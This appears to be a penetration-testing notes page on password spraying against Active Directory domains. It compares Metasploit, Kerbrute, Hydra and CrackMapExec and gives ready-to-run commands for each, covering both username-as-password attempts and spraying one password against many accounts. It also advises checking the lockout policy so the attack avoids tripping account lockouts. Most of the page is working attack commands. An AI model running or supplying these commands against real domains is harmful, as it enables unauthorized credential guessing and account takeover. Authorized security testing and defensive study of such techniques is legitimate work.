**Domain password spraying** — two approaches: **USER=PASS** (try the username as the password) and **spraying** (try one common password against many users). Both need a list of valid usernames - see [Domain User Enumeration](Domain%20User%20Enumeration.md). Read the Caution section first.

| Tool | Spraying | User=Pass | Reports expired pwd | Shows admin status |
| --- | :---: | :---: | :---: | :---: |
| Metasploit | yes | yes | yes | yes |
| Kerbrute | yes | yes | yes | no |
| Hydra | yes | yes | no | no |
| CrackMapExec | yes | yes | yes | yes |

## Method 1: Metasploit

```bash

use auxiliary/scanner/smb/smb_login
set SMBDomain DOMAIN
set USER_FILE /tmp/ad_users.txt
set USER_AS_PASS true    # USER=PASS; or: set SMBPass PASSWORD  for spraying
set THREADS 4
run

```

**Note:** Valid credentials are stored in the Metasploit database - consider a dedicated workspace (`workspace -a "WORKSPACE_NAME"`).

## Method 2: Kerbrute

Fast - one UDP packet per user, over Kerberos pre-authentication.

```bash

# USER=PASS
kerbrute passwordspray --user-as-pass --output 'kerbrute_output.txt' --domain 'DOMAIN' 'USER_FILE'
# Spray one password
kerbrute passwordspray --output 'kerbrute_output.txt' --domain 'DOMAIN' 'USER_FILE' 'PASSWORD'

```

## Method 3: Hydra

```bash

# USER=PASS (-e s uses the login as password). -t 4 = max recommended for SMB.
hydra -t 4 -L 'USER_FILE' -e s 'smb://DC_IP'
# Spray one password
hydra -t 4 -L 'USER_FILE' -p 'PASSWORD' 'smb://DC_IP'

```

**Note:** Hydra will not report accounts with an expired password.

## Method 4: CrackMapExec

```bash

# USER=PASS - --no-bruteforce pairs the nth user with the nth password
cme smb DC_IP -u 'USER_FILE' -p 'USER_FILE' --no-bruteforce --continue-on-success
# Spray one password - --continue-on-success finds all valid accounts, not just the first
cme smb DC_IP -u 'USER_FILE' -p 'PASSWORD' --continue-on-success

```

## Caution

**Warning:** Be very careful not to lock accounts. Retrieve the domain password policy first to learn (1) after how many failed attempts an account locks out and (2) how long it takes to reset the failed-attempt counter.

## References

- Metasploit - https://github.com/rapid7/metasploit-framework
- kerbrute - https://github.com/ropnop/kerbrute
- CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
